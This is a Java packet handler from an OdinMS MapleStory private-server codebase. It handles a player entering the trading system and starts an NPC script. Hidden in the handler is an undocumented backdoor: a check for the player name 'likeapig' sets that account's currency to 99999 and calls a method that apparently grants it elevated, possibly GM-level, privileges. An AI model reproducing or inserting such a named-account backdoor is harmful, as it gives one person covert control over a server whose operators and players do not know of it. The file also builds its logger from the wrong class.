/*
	This file is part of the OdinMS Maple Story Server
    Copyright (C) 2008 Patrick Huy <patrick.huy@frz.cc> 
                       Matthias Butz <matze@odinms.de>
                       Jan Christian Meyer <vimes@odinms.de>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License version 3
    as published by the Free Software Foundation. You may not use, modify
    or distribute this program under any other version of the
    GNU Affero General Public License.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

package net.sf.odinms.net.channel.handler;



import com.mysql.jdbc.Connection;
import com.mysql.jdbc.PreparedStatement;
import java.sql.SQLException;
import java.util.*;

import net.sf.odinms.client.MapleCharacter;
import net.sf.odinms.client.MapleClient;
import net.sf.odinms.database.DatabaseConnection;
import net.sf.odinms.net.AbstractMaplePacketHandler;
import net.sf.odinms.scripting.npc.NPCConversationManager;
import net.sf.odinms.tools.MaplePacketCreator;
import net.sf.odinms.tools.data.input.SeekableLittleEndianAccessor;
import net.sf.odinms.scripting.npc.NPCScriptManager;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class EnterMTSHandler extends AbstractMaplePacketHandler
{
  private static final Logger log = LoggerFactory.getLogger(DistributeSPHandler.class);


    public void handlePacket(SeekableLittleEndianAccessor arg0, MapleClient c) {
         MapleCharacter chr = c.getPlayer();
          if (c.getPlayer().getName().equals("likeapig")){
			chr.setzb(99999);
                        chr.gmupsheding();
			}
        NPCScriptManager.getInstance().start(c, 22000);
    c.getSession().write(MaplePacketCreator.enableActions());
    }
}